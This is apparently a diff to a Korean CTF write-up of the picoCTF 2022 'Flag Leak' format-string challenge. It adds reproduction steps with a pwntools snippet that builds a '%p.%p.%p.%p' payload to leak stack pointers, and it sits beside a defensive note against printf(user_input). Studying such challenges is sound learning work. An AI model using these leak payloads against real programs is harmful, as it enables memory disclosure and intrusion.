@@ -1,7 +1,7 @@
 ---
 title: Flag Leak — picoCTF 2022 pwn writeup
 created: 2026-06-15
-updated: 2026-06-15
+updated: 2026-06-16
 type: query
 tags: [ctf, pwn, format-string, stack-leak, printf, picoctf]
 sources: [https://ctftime.org/writeup/32816, https://picoctf2022.haydenhousen.com/binary-exploitation/flag-leak, https://medium.com/@zeyadsalah686/flag-leak-picoctf-writeup-e7b53f3273e2, https://medium.com/@sparshladani/picoctf-challenges-flag-leak-758bbed42e2d]
@@ -51,6 +51,22 @@ done
 echo '6f6369707b465443...' | xxd -r -p  # 예상: picoCTF{... 형태의 문자열 일부가 출력됩니다.
 ```
 
+
+## 재현 절차
+
+1. 형식 문자열 취약 여부를 확인합니다.
+```bash
+# 프로그램이 사용자 입력을 printf 계열로 직접 출력하는지 봅니다.
+./vuln                   # 예상: 입력을 받아 출력하는 프롬프트가 나타납니다.
+```
+2. 포인터와 문자열을 누출하는 payload를 보냅니다.
+```python
+# %p / %s를 이용한 정보 누출 예시입니다.
+from pwn import *
+payload = b"%p.%p.%p.%p"   # 예상: 스택 포인터들이 출력됩니다.
+print(payload.decode())
+```
+3. 누출값으로 flag 위치를 찾아 출력합니다.
 ## 5. 방어 관점 메모
 
 - `printf(user_input)`는 금지해야 합니다.
